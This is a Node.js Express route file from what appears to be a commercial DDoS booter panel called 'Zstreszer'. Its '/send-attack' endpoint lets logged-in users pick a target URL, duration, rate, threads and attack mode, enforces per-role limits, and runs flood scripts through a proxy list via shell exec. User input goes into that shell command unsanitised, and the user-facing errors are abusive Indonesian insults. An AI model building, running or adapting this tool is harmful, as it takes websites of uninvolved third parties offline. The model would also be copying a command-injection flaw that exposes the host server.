require("../../config");
const express = require('express');
const router = express.Router();
const { exec } = require('child_process');
const {sleep} = require('../lib/LoadDB')
//================
const { requireOwner, requireLogin, checkLimit } = require('../lib/ServerF');
//================
router.post('/send-attack', requireLogin, checkLimit, (req, res) => {
const { target, time, rate, thread, mode } = req.body;
const username = req.session?.username;
let user = global.db?.users?.[username];
const isMainOwner = username === global.username;
if (!user && isMainOwner) {
user = { role: 'owner', usage: 0 };
}
const role = user?.role || 'user';
const roleLimits = {
owner: { time: 580, rate: 10000, thread: 300 },
premium: { time: 120, rate: 1600, thread: 40 },
user: { time: 60, rate: 800, thread: 20 }
};
const limits = roleLimits[role];
const simpleOnly = ['quantum'];
if (!target || !time || !mode) {
return res.status(400).json({ error: '400: Lu bego ya? Isi semua data anjing.' });
}
if (!/^https?:\/\//.test(target)) {
return res.status(400).json({ error: '400: Itu link apaan kont*l? Format salah woy!' });
}
if (isNaN(time)) {
return res.status(400).json({ error: '400: Waktu harus angka goblok, bukan huruf!' });
}
if (time > limits.time) {
return res.status(400).json({ error: `400: Gak bisa bego! Maksimal waktu buat role ${role} cuma ${limits.time} detik.` });
}
if (!simpleOnly.includes(mode.toLowerCase())) {
if (!rate || !thread) {
return res.status(400).json({ error: '400: Rate sama thread mana bangke? Jangan setengah-setengah!' });
}
if (isNaN(rate) || isNaN(thread)) {
return res.status(400).json({ error: '400: Rate/thread itu angka, bukan tai ayam.' });
}
 if (rate > limits.rate) {
return res.status(400).json({ error: `400: Kelewatan anjing! Maks rate role ${role} itu ${limits.rate} doang.` });
}
if (thread > limits.thread) {
return res.status(400).json({ error: `400: Ngimpi lu? Thread lu kebanyakan, role ${role} mentok ${limits.thread} doang.` });
}
}
const execCommand = {
hentai: `node ./database/ddos/hentai.js ${target} ${time} ${rate} ${thread} ./database/ddos/proxy.txt`,
hold: `node ./database/ddos/tlsvip.js ${target} ${time} ${rate} ${thread} ./database/ddos/proxy.txt`,
flood: `node ./database/ddos/flood.js ${target} ${time} ${rate} ${thread} ./database/ddos/proxy.txt`,
bypass: `node ./database/ddos/bypass.js ${target} ${time} ${rate} ${thread} ./database/ddos/proxy.txt`,
quantum: `node ./database/ddos/quantum.js ${target} ${time}`,
mixmax: `node ./database/ddos/mix.js ${target} ${time} ${rate} ${thread}`,
thunder: `node ./database/ddos/thunder.js ${target} ${time} ${rate} ${thread} ./database/ddos/proxy.txt`
};
const command = execCommand[mode.toLowerCase()];
if (!command) {
console.warn(`[WARN] Mode serangan gak dikenal: ${mode}`);
return res.status(400).json({ error: '400: Mode apaan tuh? Ngaco lu!' });
}
res.json({ success: true, message: `Zstreszer Started` });
exec(command, (error, stdout, stderr) => {
let log = '';
if (error) log += `[ERROR] ${error.message}\n`;
if (stderr) log += `[STDERR] ${stderr}\n`;
log += `[SUCCESS ATTACK] ${stdout}`;
console.log(log);
});
});
//============
module.exports = router;